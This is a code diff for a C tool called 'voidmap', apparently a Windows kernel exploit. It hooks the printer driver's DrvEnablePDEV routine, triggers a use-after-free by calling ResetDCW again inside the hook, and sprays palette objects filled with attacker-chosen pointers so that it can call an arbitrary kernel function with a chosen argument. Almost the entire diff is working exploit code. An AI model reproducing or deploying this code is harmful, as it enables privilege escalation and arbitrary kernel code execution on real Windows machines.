@@ -6,10 +6,62 @@ typedef VOID(*VoidFunc_t)();
 
 DHPDEV HookedFunction(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
 PFN originalFunction;
+BOOL shouldTrigger = FALSE;
+HDC dummy;
+char printerName[0x100];
+
+DWORD64 argument;
+DWORD64 targetFunction;
+
+void SprayPalettes(DWORD size)
+{
+    DWORD count = (size - 0x90) / 4;
+    DWORD paletteSize = sizeof(LOGPALETTE) + (count - 1) * sizeof(PALETTEENTRY);
+    LOGPALETTE* palette = malloc(paletteSize);
+    if (palette == NULL) 
+    {
+        ConsoleError("Failed to allocate buffer!");
+        return;
+    }
+
+    DWORD64* p = (DWORD64*)((DWORD64)palette + 4);
+    for (DWORD i = 0; i < 0x120; i++) 
+        p[i] = argument;
+
+    for (DWORD i = 0x120; i < (paletteSize - 4) / 8; i++)
+        p[i] = targetFunction;
+
+    palette->palNumEntries = (WORD)count;
+    palette->palVersion = 0x300;
+
+    for (DWORD i = 0; i < 0x5000; i++)
+        CreatePalette(palette);
+}
 
 DHPDEV HookedFunction(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
 {
+    ConsoleSuccess("Hooked function called");
+
+    ConsoleInfo("Calling original...");
     DHPDEV original = ((DrvEnablePDEV_t)originalFunction)(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
+    ConsoleSuccess("Original return: 0x%p", original);
+
+    if (!shouldTrigger)
+    {
+        ConsoleWarning("Skipped exploit trigger");
+        return original;
+    }
+    
+    shouldTrigger = FALSE;
+
+    ConsoleInfo("Triggering UAF with second reset...");
+    HDC temp = ResetDCW(dummy, NULL);
+    ConsoleSuccess("Returned from second reset: 0x%p", temp);
+
+    ConsoleInfo("Spraying palettes...");
+    SprayPalettes(0xe20);
+    ConsoleSuccess("Spaying done");
+
     return original;
 }
 
@@ -46,6 +98,7 @@ BOOL SetupHooks()
         PRINTER_INFO_4A* currentPrinter = &printerEnum[i];
 
         ConsoleInfo("Opening printer %s...", currentPrinter->pPrinterName);
+        strcpy(printerName, currentPrinter->pPrinterName);
         HANDLE printerHandle;
         status = OpenPrinterA(currentPrinter->pPrinterName, &printerHandle, NULL);
         if (!status)
@@ -162,6 +215,16 @@ BOOL SetupHooks()
     return FALSE;
 }
 
+void CallKernelFunction(PVOID function, DWORD64 rdx)
+{
+    ConsoleInfo("Attempting to call 0x%p with param %llu...", function, rdx);
+    argument = rdx;
+    targetFunction = (DWORD64)function;
+    shouldTrigger = TRUE;
+    ResetDC(dummy, NULL);
+    ConsoleSuccess("Call might have succeeded");
+}
+
 int main(int argc, char* argv[])
 {
     ConsoleTitle("voidmap");
@@ -238,4 +301,14 @@ int main(int argc, char* argv[])
         ConsoleError("Failed to setup hooks!");
         return -1;
     }
+
+    ConsoleInfo("Creating device context...");
+    dummy = CreateDCA(NULL, printerName, NULL, NULL);
+    if (!dummy)
+    {
+        ConsoleError("Failed to create device context!");
+        return -1;
+    }
+
+    CallKernelFunction((PVOID)0xDEAD, 0xDEAD);
 }
